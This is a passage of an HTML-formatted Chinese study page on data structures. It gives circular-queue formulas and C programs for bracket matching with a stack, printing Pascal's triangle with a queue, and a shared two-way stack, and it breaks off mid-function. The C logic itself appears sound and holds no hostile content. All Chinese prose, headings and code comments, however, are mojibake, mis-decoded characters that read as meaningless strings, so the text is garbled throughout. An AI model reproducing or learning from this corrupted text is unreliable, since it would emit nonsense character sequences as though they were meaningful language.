id="å¾ªç¯é˜Ÿåˆ—ä¸­çš„å…³é”®å…¬å¼ä¸è¦ç‚¹æ€»ç»“"><a href="#å¾ªç¯é˜Ÿåˆ—ä¸­çš„å…³é”®å…¬å¼ä¸è¦ç‚¹æ€»ç»“" class="headerlink" title="å¾ªç¯é˜Ÿåˆ—ä¸­çš„å…³é”®å…¬å¼ä¸è¦ç‚¹æ€»ç»“"></a>å¾ªç¯é˜Ÿåˆ—ä¸­çš„å…³é”®å…¬å¼ä¸è¦ç‚¹æ€»ç»“</h5><ol><li>åˆå§‹çŠ¶æ€</li></ol><p>[ Q_front &#x3D; Q_rear &#x3D; 0 ]</p><ul><li>é˜Ÿé¦–æŒ‡é’ˆ <strong><code>Q_front</code></strong> å’Œé˜Ÿå°¾æŒ‡é’ˆ <strong><code>Q_rear</code></strong> éƒ½åˆå§‹åŒ–ä¸º <code>0</code>ï¼Œè¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©ºã€‚</li></ul><ol start="2"><li>é˜Ÿé¦–æŒ‡é’ˆè¿› 1ï¼ˆå‡ºé˜Ÿæ“ä½œï¼‰</li></ol><p>[ Q_front &#x3D; (Q_front + 1) % MaxSize ]</p><ul><li>å½“æœ‰å…ƒç´ å‡ºé˜Ÿæ—¶ï¼Œé˜Ÿé¦–æŒ‡é’ˆ <strong><code>Q_front</code></strong> å‘å‰ç§»åŠ¨ä¸€ä½ï¼Œä½¿ç”¨å–æ¨¡æ“ä½œ <strong><code>% MaxSize</code></strong> ç¡®ä¿å®ƒå¯ä»¥å¾ªç¯åˆ°æ•°ç»„çš„å¼€å¤´ã€‚</li></ul><ol start="3"><li>é˜Ÿå°¾æŒ‡é’ˆè¿› 1ï¼ˆå…¥é˜Ÿæ“ä½œï¼‰</li></ol><p>[ Q_rear &#x3D; (Q_rear + 1) % MaxSize ]</p><ul><li>å½“æœ‰æ–°å…ƒç´ å…¥é˜Ÿæ—¶ï¼Œé˜Ÿå°¾æŒ‡é’ˆ <strong><code>Q_rear</code></strong> å‘å‰ç§»åŠ¨ä¸€ä½ï¼Œå–æ¨¡æ“ä½œ <strong><code>% MaxSize</code></strong> ç¡®ä¿å®ƒå¯ä»¥å¾ªç¯åˆ°æ•°ç»„çš„å¼€å¤´ã€‚</li></ul><ol start="4"><li>é˜Ÿåˆ—é•¿åº¦è®¡ç®—å…¬å¼</li></ol><p>[ \text{å…ƒç´ ä¸ªæ•°} &#x3D; (Q_rear + MaxSize - Q_front) % MaxSize ]</p><ul><li>è¯¥å…¬å¼ç”¨äºè®¡ç®—å½“å‰é˜Ÿåˆ—ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚</li><li><strong><code>(Q_rear + MaxSize - Q_front)</code></strong> ç”¨äºè®¡ç®— <code>rear</code> å’Œ <code>front</code> ä¹‹é—´çš„è·ç¦»ï¼Œæ— è®ºå®ƒä»¬çš„ä½ç½®å…³ç³»å¦‚ä½•ã€‚</li><li><strong>å–æ¨¡æ“ä½œ</strong> <strong><code>% MaxSize</code></strong> ç¡®ä¿ç»“æœåœ¨åˆæ³•èŒƒå›´å†…ã€‚</li></ul><ol start="5"><li>é˜Ÿåˆ—çŠ¶æ€åˆ¤æ–­</li></ol><ul><li><strong>é˜Ÿåˆ—ä¸ºç©º</strong>ï¼šå½“ <code>Q_front == Q_rear</code> æ—¶ï¼Œè¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©ºã€‚</li><li><strong>é˜Ÿåˆ—å·²æ»¡</strong>ï¼šå½“ <code>(Q_rear + 1) % MaxSize == Q_front</code> æ—¶ï¼Œè¡¨ç¤ºé˜Ÿåˆ—å·²æ»¡ï¼ˆä¿ç•™äº†ä¸€ä¸ªç©ºä½ç½®ç”¨äºåŒºåˆ†ç©ºå’Œæ»¡çš„çŠ¶æ€ï¼‰ã€‚</li></ul><h4 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// æ ˆçš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">char</span> data[MAX_SIZE]; <span class="hljs-comment">// å­˜å‚¨æ ˆä¸­å…ƒç´ çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> top;             <span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆ</span><br>&#125; Stack;<br><br><span class="hljs-comment">// åˆå§‹åŒ–æ ˆ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºæ ˆ</span><br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å…¥æ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">char</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ˆæ»¡ï¼Œå…¥æ ˆå¤±è´¥</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// å…ˆå°†æ ˆé¡¶æŒ‡é’ˆåŠ 1ï¼Œå†å­˜å…¥å…ƒç´ </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// æ ˆç©ºï¼Œè¿”å›ç‰¹æ®Šå­—ç¬¦</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// å–å‡ºæ ˆé¡¶å…ƒç´ ï¼Œå¹¶å°†æ ˆé¡¶æŒ‡é’ˆå‡1</span><br>&#125;<br><br><span class="hljs-comment">// æŸ¥çœ‹æ ˆé¡¶å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// æ ˆç©ºï¼Œè¿”å›ç‰¹æ®Šå­—ç¬¦</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top];<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥æ‹¬å·æ˜¯å¦åŒ¹é…</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsMatchingPair</span><span class="hljs-params">(<span class="hljs-type">char</span> left, <span class="hljs-type">char</span> right)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (left == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;)&#x27;</span>) ||<br>           (left == <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;&#125;&#x27;</span>) ||<br>           (left == <span class="hljs-string">&#x27;[&#x27;</span> &amp;&amp; right == <span class="hljs-string">&#x27;]&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ‹¬å·å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">AreParenthesesBalanced</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *expr)</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(expr); i++) &#123;<br>        <span class="hljs-type">char</span> ch = expr[i];<br><br>        <span class="hljs-comment">// å¦‚æœæ˜¯å·¦æ‹¬å·ï¼Œå…¥æ ˆ</span><br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;(&#x27;</span> || ch == <span class="hljs-string">&#x27;&#123;&#x27;</span> || ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>            <span class="hljs-built_in">Push</span>(&amp;stack, ch);<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœæ˜¯å³æ‹¬å·ï¼Œæ£€æŸ¥æ ˆé¡¶å…ƒç´ æ˜¯å¦åŒ¹é…</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;)&#x27;</span> || ch == <span class="hljs-string">&#x27;&#125;&#x27;</span> || ch == <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(&amp;stack) || !<span class="hljs-built_in">IsMatchingPair</span>(<span class="hljs-built_in">Pop</span>(&amp;stack), ch)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// ä¸åŒ¹é…</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æœ€åæ£€æŸ¥æ ˆæ˜¯å¦ä¸ºç©º</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">IsEmpty</span>(&amp;stack);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *expr = <span class="hljs-string">&quot;&#123;[()]&#125;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">AreParenthesesBalanced</span>(expr)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‹¬å·åŒ¹é…æˆåŠŸ\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‹¬å·ä¸åŒ¹é…\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆæ¨è¾‰ä¸‰è§’</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ï¼Œç”¨äºå­˜å‚¨æ¨è¾‰ä¸‰è§’çš„å…ƒç´ </span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// é˜Ÿåˆ—æ•°ç»„</span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// é˜Ÿå¤´æŒ‡é’ˆ</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// é˜Ÿå°¾æŒ‡é’ˆ</span><br>&#125; Queue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    q-&gt;front = <span class="hljs-number">0</span>;<br>    q-&gt;rear = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;front == q-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (q-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == q-&gt;front;<br>&#125;<br><br><span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *q, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(q)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// é˜Ÿåˆ—å·²æ»¡ï¼Œå…¥é˜Ÿå¤±è´¥</span><br>    &#125;<br>    q-&gt;data[q-&gt;rear] = value;<br>    q-&gt;rear = (q-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *q, <span class="hljs-type">int</span> *value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(q)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œå‡ºé˜Ÿå¤±è´¥</span><br>    &#125;<br>    *value = q-&gt;data[q-&gt;front];<br>    q-&gt;front = (q-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// ç”Ÿæˆå¹¶æ‰“å°æ¨è¾‰ä¸‰è§’</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintYangHuiTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> rows)</span> </span>&#123;<br>    Queue q;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;q);<br><br>    <span class="hljs-built_in">Enqueue</span>(&amp;q, <span class="hljs-number">1</span>); <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€è¡Œ</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= rows; i++) &#123;<br>        <span class="hljs-type">int</span> prev = <span class="hljs-number">0</span>, current;<br><br>        <span class="hljs-comment">// æ‰“å°å¹¶ç”Ÿæˆå½“å‰è¡Œ</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>            <span class="hljs-built_in">Dequeue</span>(&amp;q, &amp;current); <span class="hljs-comment">// å–å‡ºå½“å‰å…ƒç´ </span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, current);<br>            <span class="hljs-built_in">Enqueue</span>(&amp;q, prev + current); <span class="hljs-comment">// å°†å‰ä¸€ä¸ªå…ƒç´ å’Œå½“å‰å…ƒç´ ä¹‹å’Œå…¥é˜Ÿ</span><br>            prev = current; <span class="hljs-comment">// æ›´æ–° prev ä¸ºå½“å‰å…ƒç´ </span><br>        &#125;<br>        <span class="hljs-built_in">Enqueue</span>(&amp;q, <span class="hljs-number">1</span>); <span class="hljs-comment">// æ¯è¡Œæœ«å°¾åŠ å…¥ 1</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> rows;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ¨è¾‰ä¸‰è§’çš„è¡Œæ•°: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rows);<br><br>    <span class="hljs-built_in">PrintYangHuiTriangle</span>(rows);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è®¾æœ‰ä¸¤ä¸ªæ ˆ slã€s2éƒ½é‡‡ç”¨é¡ºåºæ ˆæ–¹å¼ï¼Œå¹¶ä¸”å…±äº«ä¸€ä¸ªå­˜å‚¨åŒº[0.MAXSIZE-1]ï¼Œä¸ºäº†å°½é‡åˆ©ç”¨ç©ºé—´ï¼Œå‡å°‘æº¢å‡ºçš„å¯èƒ½ï¼Œå¯é‡‡ç”¨æ ˆé¡¶ç›¸å‘ã€è¿é¢å¢é•¿çš„å­˜å‚¨æ–¹å¼ï¼Œè¯•è®¾è®¡å…¥æ ˆã€å‡ºæ ˆçš„ç®—æ³•ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// å…±äº«å­˜å‚¨åŒºçš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAXSIZE]; <span class="hljs-comment">// å­˜å‚¨åŒº</span><br>    <span class="hljs-type">int</span> top1;          <span class="hljs-comment">// æ ˆs1çš„æ ˆé¡¶æŒ‡é’ˆ</span><br>    <span class="hljs-type">int</span> top2;          <span class="hljs-comment">// æ ˆs2çš„æ ˆé¡¶æŒ‡é’ˆ</span><br>&#125; SharedStack;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å…±äº«æ ˆ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(SharedStack *stack)</span> </span>&#123;<br>    stack-&gt;top1 = <span class="hljs-number">-1</span>;        <span class="hljs-comment">// s1çš„æ ˆé¡¶æŒ‡é’ˆåˆå§‹åŒ–ä¸º-1</span><br>    stack-&gt;top2 = MAXSIZE;   <span class="hljs-comment">// s2çš„æ ˆé¡¶æŒ‡é’ˆåˆå§‹åŒ–ä¸ºMAXSIZE</span><br>&#125;<br><br><span class="hljs-comment">// å…¥æ ˆæ“ä½œï¼Œflag=1è¡¨ç¤ºs1ï¼Œflag=2è¡¨ç¤ºs2</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(SharedStack *stack, <span class="hljs-type">int</span> value, <span class="hljs-type">int</span> flag)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (stack-&gt;top1 + <span class="hljs-number">1</span> == stack-&gt;top2) &#123; <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ ˆæ»¡</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆæ»¡ï¼Œæ— æ³•å…¥æ ˆ\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// s1å…¥æ ˆ</span><br>        stack-&gt;data[++stack-&gt;top1] = value;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// s2å…¥æ ˆ</span><br>        stack-&gt;data[--stack-&gt;top2] = value;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„æ ˆæ ‡è¯†\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// å‡ºæ ˆæ“ä½œï¼Œflag=1è¡¨ç¤ºs1ï¼Œflag=2è¡¨ç¤ºs2</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(SharedStack *stack, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> flag)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// s1å‡ºæ ˆ</span><br>        <span class="hljs-keyword">if</span> (stack-&gt;top1 == <span class="hljs-number">-1</span>) &#123; <span class="hljs-comment">// åˆ¤æ–­s1æ˜¯å¦ä¸ºç©º</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆs1ç©ºï¼Œæ— æ³•å‡ºæ ˆ\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        *value = stack-&gt;data[stack-&gt;top1--];<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// s2å‡ºæ ˆ</span><br>        <span class="hljs-keyword">if</span> (stack-&gt;top2 == MAXSIZE) &#123; <span class="hljs-comment">// åˆ¤æ–­s2æ˜¯å¦ä¸ºç©º</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆs2ç©ºï¼Œæ— æ³•å‡ºæ ˆ\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        *value = stack-&gt;data[stack-&gt;top2++];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„æ ˆæ ‡è¯†\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> 